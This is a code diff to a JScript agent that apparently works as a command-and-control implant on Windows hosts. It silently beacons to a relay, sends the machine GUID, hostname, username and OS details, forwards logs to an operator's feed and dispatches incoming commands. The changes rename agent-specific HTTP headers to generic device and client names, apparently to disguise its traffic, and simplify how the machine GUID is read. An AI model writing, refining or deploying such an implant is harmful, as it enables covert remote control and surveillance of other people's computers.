@@ -20,7 +20,7 @@ function runAgent() {
         if (!shell) shell = new ActiveXObject('WScript.Shell');
     }
     // log() = relay ship ONLY (zero local echo — no Echo, no alert, no dbg).
-    // Every line is POSTed with X-Agent-Log: 1: the relay answers immediately
+    // Every line is POSTed with X-Log-Only: 1: the relay answers immediately
     // (no long-poll hold) and broadcasts an agent_log event to the operator's
     // events feed. NEVER fatal — a failed ship is swallowed in silence. Body =
     // one frame holding the line (UTF-8-ish: chars are masked to a byte).
@@ -58,7 +58,7 @@ function runAgent() {
             for (var h = 0; h < identityHeaders.length; h++) {
                 try { xhr.setRequestHeader(identityHeaders[h][0], identityHeaders[h][1]); } catch (e2) {}
             }
-            xhr.setRequestHeader('X-Agent-Log', '1');
+            xhr.setRequestHeader('X-Log-Only', '1');
             logShips.push({ x: xhr, b: sendBody(xhr, buildBodyStream([bytes])) });
         } catch (e3) {}
     }
@@ -205,20 +205,14 @@ function runAgent() {
         // GUID on many machines, and letting host bitness pick the view mints a second agent
         // row on the same target.
         function readMachineGuid() {
+            // The default view ONLY — redirected to the Wow6432Node copy when this host is
+            // x86 on a 64-bit OS (that redirected copy IS the canonical uuid), the single
+            // view on a 32-bit OS. NO cross-view fallback: StdRegProv serves the NATIVE
+            // 64-bit view regardless of caller bitness, and that copy holds a DIFFERENT
+            // GUID on many machines — keying on it would mint a second agent row. A miss
+            // falls through to the SMBIOS uuid below, matching the C# breed's chain.
             var value = '';
             try { value = ('' + shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid')).toLowerCase(); } catch (e) {}
-            if (!GUID_RE.test(value)) {
-                // WScript.Shell can hit 32/64-bit registry redirection; use WMI StdRegProv as a fallback.
-                try {
-                    var reg = new ActiveXObject('WbemScripting.SWbemLocator').ConnectServer('.', 'root\\default').Get('StdRegProv');
-                    var inParams = reg.Methods_.Item('GetStringValue').InParameters.SpawnInstance_();
-                    inParams.hDefKey = 0x80000002; // HKEY_LOCAL_MACHINE
-                    inParams.sSubKeyName = 'SOFTWARE\\Microsoft\\Cryptography';
-                    inParams.sValueName = 'MachineGuid';
-                    var outParams = reg.ExecMethod_('GetStringValue', inParams);
-                    if (outParams.ReturnValue == 0) value = ('' + outParams.sValue).toLowerCase();
-                } catch (e2) {}
-            }
             return value;
         }
         var guid = '';
@@ -300,20 +294,20 @@ function runAgent() {
         // carries the full width, and x86_64/aarch64 are both 64-bit — a bare bit flag
         // would say nothing about which.
         var headers = [
-            ['X-Agent-Api-Version', '1'],
-            ['X-Agent-Platform', 'Windows'],
-            ['X-Agent-Name-Id', '1'],
-            ['X-Agent-Capabilities', '0800000000000000']
+            ['X-Api-Version', '1'],
+            ['X-Platform', 'Windows'],
+            ['X-Client-Id', '1'],
+            ['X-Client-Features', '0800000000000000']
         ];
         function addHeader(name, value) { if (value) headers.push([name, '' + value]); }
-        addHeader('X-Agent-Machine-Uuid', guid);
-        addHeader('X-Agent-Session-Key', makeSessionKey());
-        addHeader('X-Agent-Hostname', readEnv('COMPUTERNAME'));
-        addHeader('X-Agent-Username', readEnv('USERNAME'));
-        addHeader('X-Agent-Arch', arch);
-        addHeader('X-Agent-Process-Arch', processArch);
-        addHeader('X-Agent-Os-Version', osVersion);
-        addHeader('X-Agent-Build', buildNumber);
+        addHeader('X-Device-Id', guid);
+        addHeader('X-Session-Id', makeSessionKey());
+        addHeader('X-Device-Name', readEnv('COMPUTERNAME'));
+        addHeader('X-User-Id', readEnv('USERNAME'));
+        addHeader('X-Device-Arch', arch);
+        addHeader('X-App-Arch', processArch);
+        addHeader('X-OS-Version', osVersion);
+        addHeader('X-OS-Build', buildNumber);
         return headers;
     }
     function dispatchCommand(frame) {
@@ -379,7 +373,7 @@ function runAgent() {
     identityHeaders = buildIdentity();
     var uuidForLog = '';
     for (var u = 0; u < identityHeaders.length; u++)
-        if (identityHeaders[u][0] == 'X-Agent-Machine-Uuid') uuidForLog = identityHeaders[u][1];
+        if (identityHeaders[u][0] == 'X-Device-Id') uuidForLog = identityHeaders[u][1];
     log('JScript agent beaconing to ' + beaconUrl + ' as ' + (uuidForLog || 'an unidentified machine'));
     var pendingReplies = [];
     // ── the beacon loop ─────────────────────────────────────────────────────
